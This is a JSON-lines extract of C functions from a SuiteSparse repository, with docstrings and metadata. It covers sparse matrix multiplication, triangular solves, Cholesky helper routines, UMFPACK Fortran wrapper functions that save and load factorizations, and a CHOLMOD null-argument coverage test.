{"docstring": "/* -------------------------------------------------------------------------- */\n/* construct a file name from a file number (not user-callable) */\n/* -------------------------------------------------------------------------- */\n", "func_signal": "static void make_filename (Int filenum, char *prefix, char *filename)", "code": "{\n    char *psrc, *pdst ;\n#ifdef ZLONG\n    sprintf (filename, \"%s%ld.umf\", prefix, filenum) ;\n#else\n    sprintf (filename, \"%s%d.umf\", prefix, filenum) ;\n#endif\n    /* remove any spaces in the filename */\n    pdst = filename ;\n    for (psrc = filename ; *psrc ; psrc++)\n    {\n\tif (!isspace (*psrc)) *pdst++ = *psrc ;\n    }\n    *pdst = '\\0' ;\n}", "path": "UMFPACK\\Demo\\umf4_f77zwrapper.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* C = A*B */\n", "func_signal": "cs *cs_multiply (const cs *A, const cs *B)", "code": "{\n    csi p, j, nz = 0, anz, *Cp, *Ci, *Bp, m, n, bnz, *w, values, *Bi ;\n    double *x, *Bx, *Cx ;\n    cs *C ;\n    if (!CS_CSC (A) || !CS_CSC (B)) return (NULL) ;      /* check inputs */\n    if (A->n != B->m) return (NULL) ;\n    m = A->m ; anz = A->p [A->n] ;\n    n = B->n ; Bp = B->p ; Bi = B->i ; Bx = B->x ; bnz = Bp [n] ;\n    w = cs_calloc (m, sizeof (csi)) ;                    /* get workspace */\n    values = (A->x != NULL) && (Bx != NULL) ;\n    x = values ? cs_malloc (m, sizeof (double)) : NULL ; /* get workspace */\n    C = cs_spalloc (m, n, anz + bnz, values, 0) ;        /* allocate result */\n    if (!C || !w || (values && !x)) return (cs_done (C, w, x, 0)) ;\n    Cp = C->p ;\n    for (j = 0 ; j < n ; j++)\n    {\n        if (nz + m > C->nzmax && !cs_sprealloc (C, 2*(C->nzmax)+m))\n        {\n            return (cs_done (C, w, x, 0)) ;             /* out of memory */\n        } \n        Ci = C->i ; Cx = C->x ;         /* C->i and C->x may be reallocated */\n        Cp [j] = nz ;                   /* column j of C starts here */\n        for (p = Bp [j] ; p < Bp [j+1] ; p++)\n        {\n            nz = cs_scatter (A, Bi [p], Bx ? Bx [p] : 1, w, x, j+1, C, nz) ;\n        }\n        if (values) for (p = Cp [j] ; p < nz ; p++) Cx [p] = x [Ci [p]] ;\n    }\n    Cp [n] = nz ;                       /* finalize the last column of C */\n    cs_sprealloc (C, 0) ;               /* remove extra space from C */\n    return (cs_done (C, w, x, 1)) ;     /* success; free workspace, return C */\n}", "path": "CSparse\\Source\\cs_multiply.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* call umf4zpinf (control) */\n", "func_signal": "void umf4zpinf (double Control [UMFPACK_CONTROL], double Info [UMFPACK_INFO])", "code": "{\n    fflush (stdout) ;\n    UMFPACK_report_info (Control, Info) ;\n    fflush (stdout) ;\n}", "path": "UMFPACK\\Demo\\umf4_f77zwrapper.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* z = cs_gaxpy (A,x,y) computes z = A*x+y */\n", "func_signal": "void mexFunction\n(\n    int nargout,\n    mxArray *pargout [ ],\n    int nargin,\n    const mxArray *pargin [ ]\n)", "code": "{\n    cs Amatrix, *A ;\n    double *x, *y, *z ;\n    if (nargout > 1 || nargin != 3)\n    {\n        mexErrMsgTxt (\"Usage: z = cs_gaxpy(A,x,y)\") ;\n    }\n    A = cs_mex_get_sparse (&Amatrix, 0, 1, pargin [0]) ;    /* get A */\n    x = cs_mex_get_double (A->n, pargin [1]) ;              /* get x */\n    y = cs_mex_get_double (A->m, pargin [2]) ;              /* get y */\n    z = cs_mex_put_double (A->m, y, &(pargout [0])) ;       /* z = y */\n    cs_gaxpy (A, x, z) ;                                    /* z = z + A*x */\n}", "path": "CSparse\\MATLAB\\CSparse\\cs_gaxpy_mex.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* TRUE if s is a blank line or comment, FALSE otherwise */\n", "func_signal": "static int is_blank_line\n(\n    char *s\n)", "code": "{\n    int c, k ;\n    if (s [0] == '%')\n    {\n\t/* a comment line */\n\treturn (TRUE) ;\n    }\n    for (k = 0 ; k <= MAXLINE ; k++)\n    {\n\tc = s [k] ;\n\tif (c == '\\0')\n\t{\n\t    /* end of line */\n\t    break ;\n\t}\n\tif (!isspace (c))\n\t{\n\t    /* non-space character */\n\t    return (FALSE) ;\n\t}\n    }\n    return (TRUE) ;\n}", "path": "CHOLMOD\\Check\\cholmod_read.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* call umf4zlsym (symbolic, filenum, status) */\n", "func_signal": "void umf4zlsym (void **Symbolic, Int *filenum, Int *status)", "code": "{\n    char filename [LEN] ;\n    make_filename (*filenum, \"s\", filename) ;\n    *status = UMFPACK_load_symbolic (Symbolic, filename) ;\n}", "path": "UMFPACK\\Demo\\umf4_f77zwrapper.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* call umf4zsnum (numeric, filenum, status) */\n", "func_signal": "void umf4zsnum_ (void **Numeric, Int *filenum, Int *status)", "code": "{\n    char filename [LEN] ;\n    make_filename (*filenum, \"n\", filename) ;\n    *status = UMFPACK_save_numeric (*Numeric, filename) ;\n}", "path": "UMFPACK\\Demo\\umf4_f77zwrapper.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* call umf4zsol (sys, x, xz, b, bz, numeric, control, info) */\n", "func_signal": "void umf4zsol_ (Int *sys, double x [ ], double xz [ ], double b [ ],\n    double bz [ ], void **Numeric,\n    double Control [UMFPACK_CONTROL], double Info [UMFPACK_INFO])", "code": "{\n    Control [UMFPACK_IRSTEP] = 0 ;\n    (void) UMFPACK_solve (*sys, (Int *) NULL, (Int *) NULL, (double *) NULL,\n\t(double *) NULL, x, xz, b, bz, *Numeric, Control, Info) ;\n}", "path": "UMFPACK\\Demo\\umf4_f77zwrapper.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* solve Lx=b where x and b are dense.  x=b on input, solution on output. */\n", "func_signal": "csi cs_lsolve (const cs *L, double *x)", "code": "{\n    csi p, j, n, *Lp, *Li ;\n    double *Lx ;\n    if (!CS_CSC (L) || !x) return (0) ;                     /* check inputs */\n    n = L->n ; Lp = L->p ; Li = L->i ; Lx = L->x ;\n    for (j = 0 ; j < n ; j++)\n    {\n        x [j] /= Lx [Lp [j]] ;\n        for (p = Lp [j]+1 ; p < Lp [j+1] ; p++)\n        {\n            x [Li [p]] -= Lx [p] * x [j] ;\n        }\n    }\n    return (1) ;\n}", "path": "CSparse\\Source\\cs_lsolve.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* call umf4zsolr (sys, Ap, Ai, Ax, Az, x, xz, b, bz, numeric, control, info) */\n", "func_signal": "void umf4zsolr (Int *sys, Int Ap [ ], Int Ai [ ], double Ax [ ], double Az [ ],\n    double x [ ], double xz [ ], double b [ ], double bz [ ], void **Numeric,\n    double Control [UMFPACK_CONTROL], double Info [UMFPACK_INFO])", "code": "{\n    (void) UMFPACK_solve (*sys, Ap, Ai, Ax, Az, x, xz, b, bz,\n\t*Numeric, Control, Info) ;\n}", "path": "UMFPACK\\Demo\\umf4_f77zwrapper.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* cs_demo3: read a matrix and test Cholesky update/downdate */\n", "func_signal": "int main (void)", "code": "{\n    problem *Prob = get_problem (stdin, 0) ;\n    demo3 (Prob) ;\n    free_problem (Prob) ;\n    return (0) ;\n}", "path": "CXSparse\\Demo\\cs_demo3.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* call umf4zssym (symbolic, filenum, status) */\n", "func_signal": "void umf4zssym_ (void **Symbolic, Int *filenum, Int *status)", "code": "{\n    char filename [LEN] ;\n    make_filename (*filenum, \"s\", filename) ;\n    *status = UMFPACK_save_symbolic (*Symbolic, filename) ;\n}", "path": "UMFPACK\\Demo\\umf4_f77zwrapper.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* find nonzero pattern of Cholesky L(k,1:k-1) using etree and triu(A(:,k)) */\n", "func_signal": "csi cs_ereach (const cs *A, csi k, const csi *parent, csi *s, csi *w)", "code": "{\n    csi i, p, n, len, top, *Ap, *Ai ;\n    if (!CS_CSC (A) || !parent || !s || !w) return (-1) ;   /* check inputs */\n    top = n = A->n ; Ap = A->p ; Ai = A->i ;\n    CS_MARK (w, k) ;                /* mark node k as visited */\n    for (p = Ap [k] ; p < Ap [k+1] ; p++)\n    {\n        i = Ai [p] ;                /* A(i,k) is nonzero */\n        if (i > k) continue ;       /* only use upper triangular part of A */\n        for (len = 0 ; !CS_MARKED (w,i) ; i = parent [i]) /* traverse up etree*/\n        {\n            s [len++] = i ;         /* L(k,i) is nonzero */\n            CS_MARK (w, i) ;        /* mark i as visited */\n        }\n        while (len > 0) s [--top] = s [--len] ; /* push path onto stack */\n    }\n    for (p = top ; p < n ; p++) CS_MARK (w, s [p]) ;    /* unmark all nodes */\n    CS_MARK (w, k) ;                /* unmark node k */\n    return (top) ;                  /* s [top..n-1] contains pattern of L(k,:)*/\n}", "path": "CSparse\\Source\\cs_ereach.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* Replace huge values with +/- Inf's, since scanf and printf don't deal\n * with Inf's properly.\n */\n", "func_signal": "static double fix_inf (double x)", "code": "{\n    if ((x >= HUGE_DOUBLE) || (x <= -HUGE_DOUBLE))\n    {\n\t/* treat this as +/- Inf (assume 2*x leads to overflow) */\n\tx = 2*x ;\n    }\n    return (x) ;\n}", "path": "CHOLMOD\\Check\\cholmod_read.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* This routine is not called during memory testing */\n", "func_signal": "void null_test (cholmod_common *cn)", "code": "{\n    cholmod_sparse *A = NULL, *F = NULL, *C = NULL, *R = NULL, *B = NULL ;\n    cholmod_factor *L = NULL ;\n    cholmod_triplet *T = NULL ;\n    cholmod_dense *X = NULL, *DeltaB = NULL, *S = NULL, *Y = NULL, *E = NULL ;\n    void *p = NULL, *ii = NULL, *jj = NULL, *xx = NULL, *zz = NULL ;\n    Int *Perm = NULL, *fset = NULL, *Parent = NULL, *Post = NULL,\n\t*RowCount = NULL, *ColCount = NULL, *First = NULL, *Level = NULL,\n\t*UserPerm = NULL, *colmark = NULL, *Constraints = NULL,\n\t*r = NULL, *c = NULL, *Set = NULL ;\n    char *name = NULL ;\n    double alpha [2], beta [2], bk [2], yk [2], rcond ;\n    double dj = 1, nm = 0, tol = 0 ;\n    int ok, stype = 0, xtype = 0, sorted = 0, packed = 0, nint = 0, update = 0,\n\tpostorder = 0, pack = 0, values = 0, mode = 0, sys = 0, norm = 0,\n\tto_xtype = 0, to_ll = 0, to_super = 0, to_packed = 0, to_monotonic = 0,\n\tscale = 0, transpose = 0, option = 0, ordering = 0, prefer = 0,\n\tmtype = 0, asym = 0 ;\n    SuiteSparse_long lr = 0, k1 = 0, k2 = 0 ;\n    size_t j = 0, need = 0, n = 0, mr = 0, nrow = 0, ncol = 0, iworksize = 0,\n\tnewsize = 0, fsize = 0, d = 0, nzmax = 0, nnew = 0, size = 0,\n\tnold = 0, xwork = 0, kstart = 0, kend = 0, nr = 0, nc = 0, len = 0,\n\tkrow = 0, k = 0 ;\n\n#ifndef NPARTITION\n    Int *Anw = NULL, *Aew = NULL, *Partition = NULL,\n\t*CParent = NULL, *Cmember = NULL ;\n    Int compress = 0 ;\n#endif\n\n    /* ---------------------------------------------------------------------- */\n    /* Core */\n    /* ---------------------------------------------------------------------- */\n\n    if (cn == NULL)\n    {\n\tok = CHOLMOD(start)(cn) ;\t\t\t\tNOT (ok) ;\n    }\n    ok = CHOLMOD(finish)(cn) ;\t\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(defaults)(cn) ;\t\t\t\tNOT (ok) ;\n    mr = CHOLMOD(maxrank)(n, cn) ;\t\t\t\tNOT (mr>0) ;\n    ok = CHOLMOD(allocate_work)(nrow, iworksize, xwork, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(free_work)(cn) ;\t\t\t\tNOT (ok) ;\n    lr = CHOLMOD(clear_flag)(cn) ;\t\t\t\tNOT (lr>=0) ;\n\n    dj = CHOLMOD(dbound)(dj, cn) ;\t\t\t\tOK (dj==0) ;\t\t\t\t\n    ok = CHOLMOD(error)(CHOLMOD_INVALID, __FILE__, __LINE__, \"oops\", cn) ;\n\t\t\t\t\t\t\t\tNOT (ok) ;\n    A = CHOLMOD(allocate_sparse)(nrow, ncol, nzmax, sorted,\n\tpacked, stype, xtype, cn) ;\t\t\t\tNOP (A) ;\n    ok = CHOLMOD(free_sparse)(&A, cn) ;\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(reallocate_sparse)(newsize, A, cn) ;\t\tNOT (ok) ;\n    lr = CHOLMOD(nnz)(A, cn) ;\t\t\t\t\tNOT (lr>=0) ;\n    A  = CHOLMOD(speye)(nrow, ncol, xtype, cn) ;\t\tNOP (A) ;\n    A  = CHOLMOD(spzeros)(nrow, ncol, 0, xtype, cn) ;\t\tNOP (A) ;\n    A  = CHOLMOD(ptranspose)(A, values, Perm, fset, fsize, cn);\tNOP (A) ;\n    A  = CHOLMOD(transpose)(A, values, cn) ;\t\t\tNOP (A) ;\n    ok = CHOLMOD(transpose_unsym)(A, values, Perm, fset, fsize, F, cn) ;\n    NOT (ok) ;\n    ok = CHOLMOD(transpose_sym)(A, values, Perm, F, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(sort)(A, cn) ;\t\t\t\t\tNOT (ok) ;\n    A  = CHOLMOD(copy_sparse)(A, cn) ;\t\t\t\tNOP (A) ;\n    C  = CHOLMOD(aat)(A, fset, fsize, mode, cn) ;\t\tNOP (C) ;\n\n    L  = CHOLMOD(allocate_factor)(n, cn) ;\t\t\tNOP (L) ;\n    ok = CHOLMOD(free_factor)(&L, cn) ;\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(reallocate_factor)(newsize, L, cn) ;\t\tNOT (ok) ;\n    ok = CHOLMOD(change_factor)(0, 0, 0, 0, 0, L, cn) ;\t\tNOT (ok) ;\n    ok = CHOLMOD(pack_factor)(L, cn) ;\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(change_factor)(to_xtype, to_ll, to_super,\n\tto_packed, to_monotonic, L, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(reallocate_column)(j, need, L, cn) ;\t\tNOT (ok) ;\n    A  = CHOLMOD(factor_to_sparse)(L, cn) ;\t\t\tNOP (A) ;\n    L  = CHOLMOD(copy_factor)(L, cn) ;\t\t\t\tNOP (L) ;\n\n    X  = CHOLMOD(allocate_dense)(nrow, ncol, d, xtype, cn) ;\tNOP (X) ;\n    X  = CHOLMOD(zeros)(nrow, ncol, xtype, cn) ;\t\tNOP (X) ;\n    X  = CHOLMOD(ones)(nrow, ncol, xtype, cn) ;\t\t\tNOP (X) ;\n    X  = CHOLMOD(eye)(nrow, ncol, xtype, cn) ;\t\t\tNOP (X) ;\n    ok = CHOLMOD(free_dense)(&X, cn) ;\t\t\t\tNOT (ok) ;\n    X  = CHOLMOD(sparse_to_dense)(A, cn) ;\t\t\tNOP (X) ;\n    A  = CHOLMOD(dense_to_sparse)(X, values, cn) ;\t\tNOP (A) ;\n    Y  = CHOLMOD(copy_dense)(X, cn) ;\t\t\t\tNOP (X) ;\n    ok = CHOLMOD(copy_dense2)(X, Y, cn) ;\t\t\tNOT (ok) ;\n\n    T  = CHOLMOD(allocate_triplet)(nrow, ncol, nzmax,\n\t    stype, xtype, cn) ;\t\t\t\t\tNOP (T) ;\n    ok = CHOLMOD(free_triplet)(&T, cn) ;\t\t\tNOT (ok) ;\n    T  = CHOLMOD(sparse_to_triplet)(A, cn) ;\t\t\tNOP (T) ;\n    A  = CHOLMOD(triplet_to_sparse)(T, 0, cn) ;\t\t\tNOP (A) ;\n    T  = CHOLMOD(copy_triplet)(T, cn) ;\t\t\t\tNOP (T) ;\n    ok = CHOLMOD(reallocate_triplet)(nzmax, T, cn) ;\t\tNOT (ok) ;\n\n    lr = CHOLMOD(postorder)(Parent, nrow, NULL, Post, cn) ;\tNOT (lr>=0) ;\n    p  = CHOLMOD(malloc)(n, size, cn) ;\t\t\t\tNOP (p) ;\n    p  = CHOLMOD(calloc)(n, size, cn) ;\t\t\t\tNOP (p) ;\n    p  = CHOLMOD(free)(n, size, p, cn) ;\t\t\tNOP (p) ;\n    p  = CHOLMOD(realloc)(nnew, size, p, &n, cn) ;\t\tNOP (p) ;\n    ok = CHOLMOD(realloc_multiple)(nnew, nint, xtype,\n\t    &ii, &jj, &xx, &zz, &nold, cn) ;\t\t\tNOT (ok) ;\n\n    C = CHOLMOD(band)(A, k1, k2, mode, cn) ;\t\t\tNOP (C) ;\n    ok = CHOLMOD(band_inplace)(k1, k2, mode, A, cn) ;\t\tNOT (ok) ;\n\n    ok = CHOLMOD(factor_xtype)(CHOLMOD_REAL, L, cn) ;\t\tNOT (ok) ;\n    ok = CHOLMOD(sparse_xtype)(CHOLMOD_REAL, A, cn) ;\t\tNOT (ok) ;\n    ok = CHOLMOD(dense_xtype)(CHOLMOD_REAL, X, cn) ;\t\tNOT (ok) ;\n    ok = CHOLMOD(triplet_xtype)(CHOLMOD_REAL, T, cn) ;\t\tNOT (ok) ;\n\n    /* ---------------------------------------------------------------------- */\n    /* Cholesky */\n    /* ---------------------------------------------------------------------- */\n\n    L  = CHOLMOD(analyze)(A, cn) ;\t\t\t\tNOP (L) ;    \n    L  = CHOLMOD(analyze_p)(A, UserPerm, fset, fsize, cn) ;\tNOP (L) ;    \n    ok = CHOLMOD(factorize)(A, L, cn) ;\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(factorize_p)(A, beta, fset, fsize, L, cn) ;\tNOT (ok) ;\n    rcond = CHOLMOD(rcond)(L, cn) ;\t\t\t\tNOT (rcond>=0) ;\n    X = CHOLMOD(solve)(sys, L, Y, cn) ;\t\t\t\tNOP (X) ;\n    C = CHOLMOD(spsolve)(sys, L, B, cn) ;\t\t\tNOP (C) ;\n    ok = CHOLMOD(etree)(A, Parent, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(rowcolcounts)(A, fset, fsize, Parent, Post,\n\tRowCount, ColCount, First, Level, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(amd)(A, fset, fsize, Perm, cn) ;\t\tNOT (ok) ;\n    ok = CHOLMOD(camd)(A, fset, fsize, Constraints, Perm, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(colamd)(A, fset, fsize, postorder, Perm, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(rowfac)(A, F, beta, kstart, kend, L, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(row_subtree)(A, F, krow, Parent, R, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(row_lsubtree)(A, c, 0, krow, L, R, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(resymbol)(A, fset, fsize, pack, L, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(resymbol_noperm)(A, fset, fsize, pack, L, cn) ;NOT (ok) ;\n    ok = CHOLMOD(analyze_ordering)(A, ordering, Perm, fset,\n\tfsize, Parent, Post, ColCount, First, Level, cn) ;\tNOT (ok) ;\n\n    /* ---------------------------------------------------------------------- */\n    /* Modify */\n    /* ---------------------------------------------------------------------- */\n\n    ok = CHOLMOD(updown)(update, C, L, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(updown_solve)(update, C, L, X, DeltaB, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(updown_mark)(update, C, colmark, L, X, DeltaB,\n\t    cn) ;\t\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(rowadd)(k, R, L, cn) ;\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(rowadd_solve)(k, R, bk, L, X, DeltaB, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(rowadd_mark)(k, R, bk, colmark, L, X, DeltaB,\n\t    cn) ;\t\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(rowdel)(k, R, L, cn) ;\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(rowdel_solve)(k, R, yk, L, X, DeltaB, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(rowdel_mark)(k, R, yk, colmark, L, X, DeltaB,\n\t    cn) ;\t\t\t\t\tNOT (ok) ;\n\n    /* ---------------------------------------------------------------------- */\n    /* MatrixOps */\n    /* ---------------------------------------------------------------------- */\n\n    C = CHOLMOD(add)(A, B, alpha, beta, values, sorted, cn) ;\tNOP (C) ;\n\n    C = CHOLMOD(copy)(A, stype, mode, cn) ;\t\t\tNOP (C) ;\n    ok = CHOLMOD(drop)(tol, A, cn) ;\t\t\t\tNOT (ok) ;\n    nm = CHOLMOD(norm_dense)(X, norm, cn) ;\t\t\tNOT (nm>=0) ;\n    nm = CHOLMOD(norm_sparse)(A, norm, cn) ;\t\t\tNOT (nm>=0) ;\n    C = CHOLMOD(horzcat)(A, B, values, cn) ;\t\t\tNOP (C) ;\n    ok = CHOLMOD(scale)(S, scale, A, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(sdmult)(A, transpose, alpha, beta, X, Y, cn) ;\tNOT (ok) ;\n    C = CHOLMOD(ssmult)(A, B, stype, values, sorted, cn) ;\tNOP (C) ;\n    C = CHOLMOD(submatrix)(A, r, nr, c, nc, values, sorted,\n\t    cn) ;\t\t\t\t\t\tNOP (C) ;\n    C = CHOLMOD(vertcat)(A, B, values, cn) ;\t\t\tNOP (C) ;\n    asym = CHOLMOD(symmetry)(A, option, NULL, NULL, NULL, NULL,\n\t    cn) ;\t\t\t\t\t\tNOT(asym>=0) ;\n\n    /* ---------------------------------------------------------------------- */\n    /* Supernodal */\n    /* ---------------------------------------------------------------------- */\n\n    ok = CHOLMOD(super_symbolic)(A, F, Parent, L, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(super_numeric)(A, F, beta, L, cn) ;\t\tNOT (ok) ;\n    ok = CHOLMOD(super_lsolve)(L, X, E, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(super_ltsolve)(L, X, E, cn) ;\t\t\tNOT (ok) ;\n\n    /* ---------------------------------------------------------------------- */\n    /* Check */\n    /* ---------------------------------------------------------------------- */\n\n    ok = CHOLMOD(check_common)(cn) ;\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(print_common)(name, cn) ;\t\t\tNOT (ok) ;\n\n    ok = CHOLMOD(check_sparse)(A, cn) ;\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(print_sparse)(A, name, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(check_dense)(X, cn) ;\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(print_dense)(X, name, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(check_factor)(L, cn) ;\t\t\t\tNOT (ok) ;\n    ok = CHOLMOD(print_factor)(L, name, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(check_triplet)(T, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(print_triplet)(T, name, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(check_subset)(Set, len, n, cn) ;\t\tNOT (ok) ;\n    ok = CHOLMOD(print_subset)(Set, len, n, name, cn) ;\t\tNOT (ok) ;\n    ok = CHOLMOD(check_perm)(Perm, n, n, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(print_perm)(Perm, n, n, name, cn) ;\t\tNOT (ok) ;\n    ok = CHOLMOD(check_parent)(Parent, n, cn) ;\t\t\tNOT (ok) ;\n    ok = CHOLMOD(print_parent)(Parent, n, name, cn) ;\t\tNOT (ok) ;\n\n    A = CHOLMOD(read_sparse)(NULL, cn) ;\t\t\tNOP (A) ;\n    p = CHOLMOD(read_matrix)(NULL, prefer, &mtype, cn) ;\tNOP (p) ;\n    X = CHOLMOD(read_dense)(NULL, cn) ;\t\t\t\tNOP (X) ;\n    T = CHOLMOD(read_triplet)(NULL, cn) ;\t\t\tNOP (T) ;\n\n    asym = CHOLMOD(write_dense) (NULL, NULL, NULL, cn) ;\tNOT (asym>=0) ;\n    asym = CHOLMOD(write_dense) ((FILE *) 1, NULL, NULL, cn) ;\tNOT (asym>=0) ;\n\n    asym = CHOLMOD(write_sparse)(NULL, NULL, NULL, NULL, cn) ;\tNOT (asym>=0) ;\n    asym = CHOLMOD(write_sparse)((FILE *) 1, NULL, NULL, NULL,\n\t    cn) ;\t\t\t\t\t\tNOT (asym>=0) ;\n\n    /* ---------------------------------------------------------------------- */\n    /* Partition */\n    /* ---------------------------------------------------------------------- */\n\n#ifndef NPARTITION\n    lr = CHOLMOD(nested_dissection)(A, fset, fsize, Perm,\n\t    CParent, Cmember, cn) ;\t\t\t\tNOT (lr >= 0) ;\n    lr = CHOLMOD(collapse_septree) (n, n, 1., 4,\n\t    CParent, Cmember, cn) ;\t\t\t\tNOT (lr >= 0) ;\n    ok = CHOLMOD(metis)(A, fset, fsize, postorder, Perm, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(ccolamd)(A, fset, fsize, Cmember, Perm, cn) ;\tNOT (ok) ;\n    ok = CHOLMOD(csymamd)(A, Cmember, Perm, cn) ;\t\tNOT (ok) ;\n    lr = CHOLMOD(bisect)(A, fset, fsize, compress,\n\t    Partition, cn) ;\t\t\t\t\tNOT (lr >= 0) ;\n    lr = CHOLMOD(metis_bisector)(A, Anw, Aew, Partition, cn) ;\tNOT (lr >= 0) ;\n#endif\n\n}", "path": "CHOLMOD\\Tcov\\null.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* find an augmenting path starting at column k and extend the match if found */\n", "func_signal": "static void cs_augment (csi k, const cs *A, csi *jmatch, csi *cheap, csi *w,\n        csi *js, csi *is, csi *ps)", "code": "{\n    csi found = 0, p, i = -1, *Ap = A->p, *Ai = A->i, head = 0, j ;\n    js [0] = k ;                        /* start with just node k in jstack */\n    while (head >= 0)\n    {\n        /* --- Start (or continue) depth-first-search at node j ------------- */\n        j = js [head] ;                 /* get j from top of jstack */\n        if (w [j] != k)                 /* 1st time j visited for kth path */\n        {\n            w [j] = k ;                 /* mark j as visited for kth path */\n            for (p = cheap [j] ; p < Ap [j+1] && !found ; p++)\n            {\n                i = Ai [p] ;            /* try a cheap assignment (i,j) */\n                found = (jmatch [i] == -1) ;\n            }\n            cheap [j] = p ;             /* start here next time j is traversed*/\n            if (found)\n            {\n                is [head] = i ;         /* column j matched with row i */\n                break ;                 /* end of augmenting path */\n            }\n            ps [head] = Ap [j] ;        /* no cheap match: start dfs for j */\n        }\n        /* --- Depth-first-search of neighbors of j ------------------------- */\n        for (p = ps [head] ; p < Ap [j+1] ; p++)\n        {\n            i = Ai [p] ;                /* consider row i */\n            if (w [jmatch [i]] == k) continue ; /* skip jmatch [i] if marked */\n            ps [head] = p + 1 ;         /* pause dfs of node j */\n            is [head] = i ;             /* i will be matched with j if found */\n            js [++head] = jmatch [i] ;  /* start dfs at column jmatch [i] */\n            break ;\n        }\n        if (p == Ap [j+1]) head-- ;     /* node j is done; pop from stack */\n    }                                   /* augment the match if path found: */\n    if (found) for (p = head ; p >= 0 ; p--) jmatch [is [p]] = js [p] ;\n}", "path": "CSparse\\Source\\cs_maxtrans.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* call umf4zlnum (numeric, filenum, status) */\n", "func_signal": "void umf4zlnum_ (void **Numeric, Int *filenum, Int *status)", "code": "{\n    char filename [LEN] ;\n    make_filename (*filenum, \"n\", filename) ;\n    *status = UMFPACK_load_numeric (Numeric, filename) ;\n}", "path": "UMFPACK\\Demo\\umf4_f77zwrapper.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* call umf4zpinf (control) */\n", "func_signal": "void umf4zpinf_ (double Control [UMFPACK_CONTROL], double Info [UMFPACK_INFO])", "code": "{\n    fflush (stdout) ;\n    UMFPACK_report_info (Control, Info) ;\n    fflush (stdout) ;\n}", "path": "UMFPACK\\Demo\\umf4_f77zwrapper.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
{"docstring": "/* call umf4zsol (sys, x, xz, b, bz, numeric, control, info) */\n", "func_signal": "void umf4zsol (Int *sys, double x [ ], double xz [ ], double b [ ],\n    double bz [ ], void **Numeric,\n    double Control [UMFPACK_CONTROL], double Info [UMFPACK_INFO])", "code": "{\n    Control [UMFPACK_IRSTEP] = 0 ;\n    (void) UMFPACK_solve (*sys, (Int *) NULL, (Int *) NULL, (double *) NULL,\n\t(double *) NULL, x, xz, b, bz, *Numeric, Control, Info) ;\n}", "path": "UMFPACK\\Demo\\umf4_f77zwrapper.c", "repo_name": "PetterS/SuiteSparse", "stars": 97, "license": "None", "language": "c", "size": 19704}
